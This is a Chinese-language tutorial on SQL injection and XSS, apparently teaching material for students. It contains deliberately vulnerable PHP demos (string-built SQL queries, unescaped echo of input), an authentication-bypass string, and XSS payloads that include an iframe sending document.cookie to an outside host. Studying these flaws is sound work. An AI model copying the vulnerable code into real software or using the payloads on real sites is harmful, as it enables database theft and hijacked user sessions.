# SQL注入与xss

## SQL注入

### 何为sql注入?

SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息;

### 原理

由于可以进行字符串拼接,所以可以代入注释符引号等对原语句进行闭合,达到执行一些未达到其他目的的sql语句

### demo

```php
<?php
$mysql=new  mysqli('127.0.0.1','root','root','sql_injection');
$username=$_POST['username'];
$password=$_POST['password'];
$type=$_GET['type'];
if (!$type){
	echo "please 'get' a type";
}
if ($type==='register'){
	$result=$mysql->query("INSERT INTO `users`(`username`, `password`) VALUES ($username,$password)");
	var_dump($result);
}
if ($type=='login'){
	$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
	$result= $mysql->query($sql);
	echo "your sql query stings is:$sql"."<br/>".PHP_EOL;
	var_dump($result);
	$row=$result->fetch_row();
	//	echo "hello ".$result[''];
	var_dump($row);
	echo '<br/>'.PHP_EOL;
	echo "hello $row[1]";
}
```

1234' or 1=1#

SELECT * FROM users WHERE username='1234' or 1=1#' AND password='12'

### 危害

轻则脱库

重则webshell

末日则人没了

想详细了解的可以看看我的博客

WAF,安全狗,还是看门狗,

湘大某某服务存在sql注入,高危

[sql注入总结](https://yanmymickey.github.io/2020/02/11/CTF/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/)

[mysql注入天书](https://www.cnblogs.com/lcamry/category/846064.html)

第二个链接会从sql基础讲起，对于sql注入理解很有帮助，里面有博客一篇篇的文章版本，还有一版pdf，在开天辟地里面有介绍。

[对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169#toc-53)

高阶知识，sql注入小能手

### 防御

防御太难了，没有一劳永逸的方法。

相对安全的方法，使用PDO的预编译，但是也要主要宽字节等等。

当你使用laravel的框架的时候，代码规范的情况下是不会出现这样的漏洞，比如使用ORM，不要用DB对象的拼接，对输入数据进行过滤，充分利用正则表达式等等过滤一切你不想要的字符（字符白名单）

## XSS

### 是什么？

跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。

### 怎么用

理解比较简单，放几个链接看看就好，到时候展示一下常见的例子，带入一下

[XSS总结](https://xz.aliyun.com/t/4067#toc-10)

```php
<?php

setcookie("user","admin");

$msg=$_POST['msg'];
//存储型
//$mysql=new  mysqli('127.0.0.1','root','root','sql_injection');
//$insert=$mysql->query("INSERT INTO `xss`(`msg`) VALUES ('$msg')");
//var_dump($insert);
//$result=$mysql->query("SELECT * FROM `xss`");
//if ($result->num_rows > 0) {
//	// 输出数据
//	while($row = $result->fetch_assoc()) {
//		echo "id: " . $row["id"]. " - msg: " . $row["msg"]."<br>";
//	}
//} else {
//	echo "0 结果";
//}

//反射型
echo $msg;

//dom型
//和反射型差不多,利用你注入的代码去操作dom

```



```http
msg=<iframe src="https://yanmy.top/index.php?cookies=document.cookie"></iframe>
msg=<script>alert(1);</script>
msg=<script>alert(document.cookie);</script>
```

html+php

//过滤,代码把你的转义,白名单

## 写在最后

希望你们多去看看原理,程序员不要停留在会用的阶段,会用的阶段你就是一个`Ctrl+c Ctrl+v`

有什么需要看的?

没事就看看nginx的原理,配置文件会写了吗?很细节的地方能写吗?不常见的用法能看懂吗? 

docker实现的原理?

laravel的底层代码?

最后要多学几门语言,学完C语言,PHP了,那么常见的高级语言都差不多类型了,入门多门语言是不难的,无非都是基础的条件,循环,流程控制。再这些语言中选一两门比较感兴趣又比较热门的深入学习，现在热门的是java，c++，python，php，go，等等一些。

看见什么多折腾折腾是有好处的

先有宽度，再有深度，不断深入学习方能成就大业。

加油叭，少年们，我们还差得远呢🙃🙃🙃

